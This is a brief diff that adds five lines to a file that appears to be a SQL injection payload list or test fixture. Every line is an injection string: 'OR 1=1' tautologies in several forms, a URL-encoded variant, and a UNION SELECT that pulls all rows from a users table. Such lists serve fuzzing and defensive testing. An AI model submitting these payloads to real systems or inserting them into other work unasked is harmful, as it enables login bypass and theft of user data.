@@ -1,0 +1,5 @@
+' OR 1=1 --
+' UNION SELECT * FROM users --
+' AND '1'='1"
+'+OR+1=1+--"
+ 83854282' or '1256'='1256
